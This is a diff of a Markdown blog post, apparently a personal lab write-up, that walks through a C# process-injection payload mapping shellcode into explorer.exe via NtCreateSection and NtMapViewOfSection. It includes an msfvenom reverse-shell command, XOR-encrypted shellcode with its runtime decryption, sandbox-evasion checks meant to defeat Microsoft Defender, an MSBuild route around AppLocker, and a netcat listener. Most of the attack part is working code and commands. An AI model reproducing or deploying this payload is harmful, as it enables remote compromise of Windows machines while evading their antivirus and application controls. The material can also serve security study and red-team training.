@@ -10,7 +10,7 @@ caption:
 
 ## Objective
 
-The objective is to design a process injection payload that utilizes low-level Win32 API calls to bypass Microsoft Defender's mitigation mechanisms and AppLocker restrictions. Specifically, this payload leverages the NtCreateSection and NtMapViewSection functions to inject shellcode into an unmanaged section of memory within the current process, and then maps this shellcode into the virtual address space of a target process, such as explorer.exe.
+The objective is to design a process injection payload that utilizes low-level Win32 API calls to bypass Microsoft Defender's mitigation mechanisms and AppLocker restrictions. Specifically, this payload leverages the NtCreateSection and NtMapViewSection functions to inject shellcode into an unmanaged section of memory within the current process, and then maps this shellcode into the virtual address space of a target process, such as explorer.exe. All the code can be found [here](https://github.com/GionaBolzer/Process-Injection).
 
 ## The setup
 
@@ -19,15 +19,15 @@ The target machine will be a Windows 10 Enterprise fully updated, at the time I 
 ```cmd
 systeminfo
 
-Hotfix(s):                 8 Hotfix(s) Installed.
-                           [01]: KB5048161
-                           [02]: KB5045936
-                           [03]: KB5011048
-                           [04]: KB5015684
-                           [05]: KB5046613
-                           [06]: KB5014032
-                           [07]: KB5016705
-                           [08]: KB5046823
+Hotfix(s):  8 Hotfix(s) Installed.
+            [01]: KB5048161
+            [02]: KB5045936
+            [03]: KB5011048
+            [04]: KB5015684
+            [05]: KB5046613
+            [06]: KB5014032
+            [07]: KB5016705
+            [08]: KB5046823
 ```
 
 This machine has a local, non-admin account, named Student that will simulate our target user.
@@ -60,7 +60,7 @@ I want to create a C# payload that uses the following Win32 APIs to inject the s
 * **[NtCreateSection](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection)** to create a section in memory to share with target process
 * **[NtMapViewOfSection](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection)** to map the section in the target process
 
-We also need to get the handles of the process with:
+We also need to get the handles of the processes with:
 
 * **[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)** for the target process
 * **[GetCurrentProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)** for our process
@@ -69,7 +69,7 @@ and invoke the shell code in the remote process with:
 
 * **[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)**
 
-We can use [P/invoke](https://www.pinvoke.net/) to call these unmanaged apis in our managed code:
+We can use [P/invoke](https://www.pinvoke.net/) to call these unmanaged APIs in our managed code:
 
 ```csharp
 [DllImport("kernel32.dll", SetLastError = true)]
@@ -117,7 +117,7 @@ public const UInt32 SECTION_EXTEND_SIZE = 0x0010;
 public const UInt32 SECTION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE;
 ```
 
-Now that we have all the functions, we can start to write the injector itself. The first thing is to get the handles of the target process and our own one:
+Now that we have all the functions, we can start to write the injector itself. The first thing is to get the handles of the target process:
 
 ```csharp
 // get process by name
@@ -128,11 +128,11 @@ int Id = localByName[0].Id;
 IntPtr hProcess = OpenProcess(0x001F0FFF, false, Id)
 ```
 
-Where the value 0x001F0FFF is PROCESS_ALL_ACCESS right, the second argument is not relevant in our use, so we set it to false.
+Where the value **0x001F0FFF** is PROCESS_ALL_ACCESS right, the second argument is not relevant in our use, so we set it to false.
 
 ## Section map
 
-Before creating the section, because we need to know the size of the shellcode, we create one and add it to the code. I choose a simple stageless one with some iterations and a simple encoder:
+Before creating the section, because we need to know the size to allocate, we create shell code. I choose a simple stageless one with some iterations and a simple encoder:
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.191.226 \
@@ -157,7 +157,7 @@ byte[] buf = new byte[610] { 0xbb,0x3b,0xe5,0x6f,0x90,0xd9,
 //size of shell code for the section
 uint maxSize = (uint)buf.Length;
 
-// well point to memory address to the section
+// will point to memory address to the section
 IntPtr handleSection = IntPtr.Zero;
 
 uint PAGE_EXECUTE_READWRITE = 0x40;
@@ -201,7 +201,7 @@ status = NtMapViewOfSection(
     );
 ```
 
-The relevant part is the use of the handleSection created before. The API will write the memory address of the view in the address_memory_own_process variable, and we set the page with PAGE_EXECUTE_READWRITE to have full access.
+The relevant part is the use of the handleSection created before. The API will write the memory address of the view in the **address_memory_own_process variable** and we set the page with PAGE_EXECUTE_READWRITE to have full access.
 
 We do the same thing with the target process:
 
@@ -219,7 +219,6 @@ status = NtMapViewOfSection(
         allocation,
         PAGE_EXECUTE_READWRITE
     );
-
 ```
 
 Now we have to simply copy the shellcode into our view, and because the section is mapped, the remote process will see it:
@@ -228,7 +227,7 @@ Now we have to simply copy the shellcode into our view, and because the section 
 Marshal.Copy(buf, 0, address_memory_own_process, buf.Length);
 ```
 
-Now we can start the thread using the address memory in the remote process:
+Then start the thread using the address memory in the remote process:
 
 ```csharp
 CreateRemoteThread(hProcess, IntPtr.Zero, 0, address_memory_explorer, IntPtr.Zero, 0, IntPtr.Zero)
@@ -236,17 +235,15 @@ CreateRemoteThread(hProcess, IntPtr.Zero, 0, address_memory_explorer, IntPtr.Zer
 
 And the process injection is complete.
 
-# Bypasses
+# Defender bypass
 
-Because we also have Defender in place, we have to craft our shellcode in an encrypted and obfuscated way to avoid static analysis. We also have to implement some AV heuristic bypasses to be fully secure.
+Because we also have Defender in place, we have to craft our shellcode in an encrypted  way to avoid static analysis. We also have to implement some AV heuristic bypasses to avoid runtime detection.
 
 ## The encrypted shell code
 
 I chose to do it with a XOR key and a loop over all bytes.
 
 Below the implementation in c#:
-
-We declare the key and the unencrypted shellcode.
 
 ```csharp
 // the key
@@ -280,7 +277,7 @@ byte[] buf = new byte[610] {
 0x2c, 0x50, 0x58, 0x54, 0xbb, 0x3b, 0xf7, 0xa5, 0x7e, 0xf6, 0x5c, ...};
 ```
 
-and we can add it to the process injection payload with a simple decryption routine at runtime:
+With the encrypted shell code can add it to the process injection payload with a simple decryption routine at runtime:
 
 ```csharp
 byte[] buf = new byte[610] {
@@ -295,15 +292,14 @@ for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ 0x2a); };
 
 ## Microsoft heuristic bypass
 
-To avoid any heuristic detection, we can use a few techniques. The first one is to call a rare Win32 API. If the call to this function is not working, we are probably running in an emulation environment by the Antivirus, so we simply exit. I chose to use [FlsAlloc](https://learn.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc):
-
+To avoid any heuristic detection, we can use a few techniques. The first one is to call a rare Win32 API. If the call to this function is not working, we are probably running in an emulation environment by the Antivirus where this function is not implemented, and we simply exit. I chose to use [FlsAlloc](https://learn.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc):
 
 ```csharp
 IntPtr x = FlsAlloc(IntPtr.Zero);
 if ((uint)x == 0xFFFFFFFF) { return; }
 ```
 
-The next technique is to simply put a sleep function. Usually, when Antivirus sees the sleep, they fast-forward to the next instruction to avoid any latency to the final user. We can simply check if the time elapsed is equal to the time slept. If not, we return:
+The next technique is to put a sleep function. Usually, when Antivirus sees the sleep, they fast-forward to the next instruction to avoid any latency to the final user. We can check if the time elapsed is equal to the time slept. If not, we return:
 
 ```csharp
 DateTime t1 = DateTime.Now;
@@ -322,12 +318,11 @@ Analyzing...
 Exhausted the search. The binary looks good to go!
 ```
 
-we see that our effort paid off.
+The binary it's clean even if it's inject a reverse shell in a remote process, cool :fire:.
 
-## AppLocker Bypass
+## AppLocker bypass
 
 Because there is also AppLocker in place, our user can't invoke the .NET framework directly in the terminal; a simple call to a C# function will fail.
-
 
 ```powershell
 PS C:\Users\student> [Math]::Cos(1)
@@ -370,9 +365,9 @@ PS C:\Tools\msbuild> type .\myproj.proj
 
 # The final payload
 
-now if we combine all togheter we obtain a code like [this](https://github.com/GionaBolzer/ProcessHollowing/blob/main/process_injection.cs).
+Now if we combine all togheter we obtain a code like [this](https://github.com/GionaBolzer/ProcessHollowing/blob/main/process_injection.cs).
 
-Now our kali box we simply start a listerner
+In the kali box we a listerner
 
 ```zsh
 rlwrap nc -lnvp 443
